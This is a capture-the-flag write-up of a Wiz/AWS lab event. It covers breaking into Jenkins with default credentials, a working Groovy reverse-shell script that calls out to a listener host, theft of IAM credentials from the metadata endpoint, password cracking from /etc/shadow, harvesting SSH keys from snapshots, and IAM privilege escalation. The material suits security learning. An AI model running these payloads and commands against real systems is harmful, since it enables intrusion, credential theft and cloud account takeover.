# Wiz Capture the Flag November 2024

I had the chance to participate to [Wiz CTF](https://www.wiz.io/events/capture-the-flag-singapore-2410) in November 2024, hosted in AWS Office.

Registering to the event triggers an email giving access to a Wiz tenant and allowing to explore an AWS account from Wiz perspective. The Capture The Flag event consists in a series of multiple choice questions about the environment, its configurations and weaknesses. It is solvable using solely Wiz to get all the information about the AWS environment.

This article takes a different approach: getting the necessary information from inside the environment by exploiting its weaknesses, getting `root` access on the different machines available, and elevating AWS access.

# Initial access

## First way in

The first way in is given by Wiz, from the Critical findings. There's a Jenkins machine with default credentials exposed to the internet. It is also vulnerable to the infamous [CVE-2024-23897](https://www.jenkins.io/security/advisory/2024-01-24/).

We can exploit `CVE-2024-23897`, but there's an easier way in.

```bash
$ java -jar jenkins-cli.jar -s http://203.0.113.1:8080/ -webSocket -auth admin:admin who-am-i @/etc/hosts
ERROR: No argument is allowed: 127.0.0.1 localhost
java -jar jenkins-cli.jar who-am-i
Reports your credential and permissions.
```

Browsing `http://203.0.113.1:8080/` and using `admin/admin` as credentials, we can access the Jenkins webui. From there, we can execute Groovy scripts from `http://203.0.113.1:8080/script`. For instance using the following

```groovy
String host="203.0.113.255";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Which gives a reverse shell

```bash
$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 203.0.113.1 58996
id
uid=111(jenkins) gid=115(jenkins) groups=115(jenkins)
```

We could have used [CVE-2023-2640](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629) to escalate privileges. Continuing the discovery, an AWS role is attached to that machine and is available via the metadata endpoint

```bash
$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/JenkinsServiceRole-ee31f43
{
  "Code" : "Success",
  "LastUpdated" : "2024-11-18T06:35:27Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA[...]WV",
  "SecretAccessKey" : "VHv[...]kmV",
  "Token" : "IQoJ[...]w33dfg==",
  "Expiration" : "2024-11-18T12:39:41Z"
}

####### Locally

export AWS_REGION=us-east-1
export AWS_ACCESS_KEY_ID=ASIA[...]WV
export AWS_SECRET_ACCESS_KEY=VHv[...]kmV
export AWS_SESSION_TOKEN=IQoJ[...]w33dfg==

$ aws sts get-caller-identity
{
    "UserId": "AROA[...]J:i-abcdef",
    "Account": "12345678910",
    "Arn": "arn:aws:sts::12345678910:assumed-role/JenkinsServiceRole-ee31f43/i-abcdef"
}
```

Let's keep this for later and explore a bit more. As a side note, this attempt is immediately detected by Wiz and shown as a Critical finding: using an IAM role outside of an EC2.

## Second way in

There's another way in. Wiz interface shows a machine exposing SSH with no credentials. We learn later on that this instance is a bastion server to access other machines.

```bash
$ ssh secureadmin@203.0.113.1
```

Trying to escalate privileges, this user does not have a password.

```bash
secureadmin@ip-10-80-36-98:~$ sudo -l
Matching Defaults entries for secureadmin on ip-10-80-36-98:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User secureadmin may run the following commands on ip-10-80-36-98:
    (ALL) NOPASSWD: ALL
secureadmin@ip-10-80-36-98:~$ sudo su
root@ip-10-80-36-98:/home/secureadmin#
```

Looking around, we can output the content of `/etc/shadow` and try to brute force users passwords. We find 1 weak password.

```bash
root@ip-10-80-36-98:/home/secureadmin# cat /etc/shadow
ubuntu:!$6$oTF4j[...]in0:19342:0:99999:7:::
gracel:$6$v/e2u[...]4qwI0:19342:0:99999:7:::
marshap:$6$XzRbc[...]SP0I.:19342:0:99999:7:::
zacf:$6$1ew6HCB.$VhJK[...]j9Ccp1:19342:0:99999:7:::
hashirc:$6$FIps2Ed3$9d0[...]AIeP.:19342:0:99999:7:::
freddyw:$6$cUeSYoln$Ne[...]xDP/:19342:0:99999:7:::

######

┌──(vagrant㉿kali)-[~]
└─$ unshadow passwd shadow

└─$ john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mypass           (hashirc)
```

However there's an easier way. Looking at the `root` user bash history, we see how the users were setup

```bash
root@ip-10-80-36-98:/home# cat ubuntu/.bash_history
sudo mv ctf-prod-key.pem ./.ssh/
ls
sudo echo -e "jdong1025\njdong1025" | sudo passwd ubuntu
sudo visudo
exit
sudo passwd --delete secureadmin
sudo passwd --delete pauloc
sudo echo -e "3r5RDNLqGhrBqmCK\n3r5RDNLqGhrBqmCK" | sudo passwd gracel
sudo echo -e "MRLcRJ5cfJSC8gzC\nMRLcRJ5cfJSC8gzC" | sudo passwd marshap
sudo echo -e "ap8GF3A8YJxNqnY5\nap8GF3A8YJxNqnY5" | sudo passwd zacf
sudo echo -e "mypass\nmypass" | sudo passwd hashirc
sudo echo -e "wizisthebest\nwizisthebest" | sudo passwd freddyw
exit
```

Beyond the passwords the other interesting piece of information is the SSH private key.

```bash
root@ip-10-80-36-98:/home/secureadmin/.ssh# cat ctf-prod-key.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEApzvfYeTF0JS7vQUrLh4yeMLruZXllAYjp+T7v2Iy+V8XXVtD
[...]
AiMf2DhQuB8r11abod6V6+xuC45dGkwt/RXdla/XNtmolczQ89My
-----END RSA PRIVATE KEY-----
```

# Lateral movement

From this point we have enough information to try getting in other machines. We have

 - a low privilege reverse shell + an IAM role
 - SSH to a machine with immediate root access + an user password + a private key

Using the different users found earlier, we can get another type of access to the Jenkins host

```bash
$ ssh pauloc@203.0.113.1
Last login: Fri Dec 16 20:36:19 2022 from 203.0.113.2
pauloc@ip-10-80-36-98:~$
```

And privileged access to other machines:

```
From jenkins:
Bastion: ssh -i ./ctf-prod-key.pem ubuntu@10.80.39.166
Payment: ssh -i ./ctf-prod-key.pem ec2-user@10.80.39.171
```

Let's use Jenkins role for further exploration. As a reminder, this is the role

```bash
$ aws sts get-caller-identity
{
    "UserId": "AROA[...]J:i-abcdef",
    "Account": "12345678910",
    "Arn": "arn:aws:sts::12345678910:assumed-role/JenkinsServiceRole-ee31f43/i-abcdef"
}
```

It allows to list EC2 instances

```bash
$ aws ec2 describe-instances | jq '.Reservations[].Instances[] | {"IP": .PrivateIpAddress, "Name": (.Tags[]|select(.Key=="Name")|.Value)}'
{
  "IP": "10.80.36.98",
  "Name": "jenkins-buildserver-ee31f43"
}
{
  "IP": "10.80.36.81",
  "Name": "jenkins-buildworker-ee31f43"
}
{
  "IP": "10.80.39.171",
  "Name": "payments-server-ee31f43"
}
{
  "IP": "10.80.39.166",
  "Name": "dev-bastion-ee31f43"
}
```

This is from this information that we know that the original SSH access was on the bastion. Continuing the exploration, we find few S3 buckets

```bash
$ aws s3api list-buckets
{
    "Buckets": [
        {
            "Name": "aws-cloudtrail-logs-12345678910-acd5a23f",
            "CreationDate": "2024-01-17T19:42:49+00:00"
        },
        {
            "Name": "cf-templates-u5t7u97v7enw-us-east-1",
            "CreationDate": "2024-03-10T21:49:38+00:00"
        },
        {
            "Name": "cf-templates-u5t7u97v7enw-us-east-2",
            "CreationDate": "2024-03-28T20:37:27+00:00"
        },
        {
            "Name": "wiz-honey-jzu5wmf-1",
            "CreationDate": "2024-11-16T07:04:33+00:00"
        },
        {
            "Name": "wiz-honey-jzu5wmf-2",
            "CreationDate": "2024-11-16T07:04:33+00:00"
        },
        {
            "Name": "wiz-honey-jzu5wmf-3",
            "CreationDate": "2024-11-16T07:04:33+00:00"
        },
        {
            "Name": "wiz-honey-jzu5wmf-4",
            "CreationDate": "2024-11-16T07:04:33+00:00"
        },
        {
            "Name": "wiz-honey-jzu5wmf-5",
            "CreationDate": "2024-11-16T07:04:33+00:00"
        },
        {
            "Name": "wiz-honey-jzu5wmf-6",
            "CreationDate": "2024-11-16T07:04:33+00:00"
        }
    ],
    "Owner": {
        "DisplayName": "wiz-labs-admins+labs001",
        "ID": "08f1fb6f30f221a15a335bf5be4db54368de89dd14f5f378a665412512d0c8b9"
    }
}
```

Different IAM roles

```bash
$ aws iam list-roles | jq '.Roles[].RoleName'
"aws-controltower-AdministratorExecutionRole"
"aws-controltower-ConfigRecorderRole"
"aws-controltower-ForwardSnsNotificationRole"
"aws-controltower-ReadOnlyExecutionRole"
"AWSControlTowerExecution"
"AWSControlTower_VPCFlowLogsRole"
"AWSReservedSSO_AWSAdministratorAccess_156072cbc247a080"
"AWSReservedSSO_AWSOrganizationsFullAccess_2813708159396036"
"AWSReservedSSO_AWSPowerUserAccess_2f1d2aea428c755f"
"AWSReservedSSO_AWSReadOnlyAccess_8467ec73c64ad37e"
"AWSServiceRoleForAmazonEKS"
"AWSServiceRoleForAmazonEKSNodegroup"
"AWSServiceRoleForAmazonGuardDuty"
"AWSServiceRoleForAutoScaling"
"AWSServiceRoleForAWSControlTower"
"AWSServiceRoleForCloudFormationStackSetsOrgMember"
"AWSServiceRoleForCloudTrail"
"AWSServiceRoleForConfig"
"AWSServiceRoleForElasticLoadBalancing"
"AWSServiceRoleForOrganizations"
"AWSServiceRoleForSecurityHub"
"AWSServiceRoleForSecurityLake"
"AWSServiceRoleForSSO"
"AWSServiceRoleForSupport"
"AWSServiceRoleForTrustedAdvisor"
"BastionRole-ee31f43"
"JenkinsServiceRole-ee31f43"
"stacksets-exec-7de7b41b81db7bd03721a1646cf2139a"
"terraform-admin"
"Wiz-Labs-Access-Role"
"WizCTF-subscription-connector-Role"
"WorkerRole-ee31f43"
```

And an ECR repo with an image

```bash
$ aws ecr list-images --repository-name ecr-raph --region us-east-2
{
    "imageIds": [
        {
            "imageDigest": "sha256:2f1fbbd656c14fc6ad79c4bbeff7585829af33f38820239352a8dd3a9cdc97bf",
            "imageTag": "lab"
        }
    ]
}
```

We now have better visibility over the environment.

As a side note, this access allows to list snapshot and download them. We can use it to get the same private key we got earlier

Either carving the key

```bash
$ ~/.cargo/bin/coldsnap download snap-0d5e806224ae247cf snap-0d5e806224ae247cf.raw
$ strings snap-0d5e806224ae247cf.raw | grep -A30 'PRIVATE KEY' | less
```

Or mounting the filesystem

```bash
┌──(vagrant㉿kali)-[/vagrant]
└─$ fdisk -l snap-0d5e806224ae247cf.raw
Disk snap-0d5e806224ae247cf.raw: 8 GiB, 8589934592 bytes, 16777216 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: 33C1FEF2-B351-4A2D-A23D-D9FB1E83BA72

Device                        Start      End  Sectors  Size Type
snap-0d5e806224ae247cf.raw1  227328 16777182 16549855  7.9G Linux filesystem
snap-0d5e806224ae247cf.raw14   2048    10239     8192    4M BIOS boot
snap-0d5e806224ae247cf.raw15  10240   227327   217088  106M EFI System

┌──(root㉿kali)-[/vagrant]
└─# sudo mount -t ext4 -o loop,offset=116391936 snap-0d5e806224ae247cf.raw /mnt
mount: (hint) your fstab has been modified, but systemd still uses
       the old version; use 'systemctl daemon-reload' to reload.
┌──(root㉿kali)-[/mnt]
└─# find . -name "ctf-*"
./home/secureadmin/.ssh/ctf-prod-key.pem
```

# Escalation of privileges

We can deepen our reach in the AWS account by modifying one of the IAM roles. We have access to 2 roles:

 - Jenkins
 - Bastion

And the Jenkins role allows to attach policies to other roles. We can exploit that:

```bash
$ aws iam attach-role-policy --role-name "BastionRole-ee31f43" --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```

Finally using the metadata endpoint on the bastion to get access the IAM role grants us an administrator role in the AWS environment. However this is limited to a selection of permission through SCPs.

```bash
ubuntu@ip-10-80-39-166:~$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/BastionRole-ee31f43/
{
  "Code" : "Success",
  "LastUpdated" : "2024-11-18T13:03:52Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA[...]QB",
  "SecretAccessKey" : "t[...]/y",
  "Token" : "IQo[...]9Gk=",
  "Expiration" : "2024-11-18T19:13:23Z"
}
```

This is the furthest we can get: root on most machines and an AWS IAM role with Administrator policy. It also covers most of the questions from the CTF questionnaire. Of course the intended way is to exploit the powerful Wiz interface to answer it.

# Scoreboard

![scoreboard](./scoreboard.png)

![timeline](./timeline.png)

Thank you Wiz and AWS teams for the wonderful event, and I was honoured to receive a beautiful gift!

![wiz gift](./wiz-gift.jpg)